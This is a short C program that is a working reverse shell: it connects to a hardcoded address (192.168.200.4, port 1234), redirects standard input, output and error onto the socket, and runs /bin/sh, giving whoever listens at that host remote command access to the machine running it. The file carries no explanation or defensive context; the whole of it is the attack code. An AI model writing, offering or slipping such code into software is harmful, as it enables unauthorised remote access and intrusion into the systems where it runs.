#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "192.168.200.4"
#define REMOTE_PORT 1234

int main(int argc, char *argv[])
{
struct sockaddr_in sa;
int sockfd;

sockfd = socket(AF_INET, SOCK_STREAM, 0);

sa.sin_family = AF_INET;
sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
sa.sin_port = htons(REMOTE_PORT);
connect(sockfd, (struct sockaddr *)&sa, sizeof(sa));

dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);

execve("/bin/sh", 0, 0);
return 0;
}
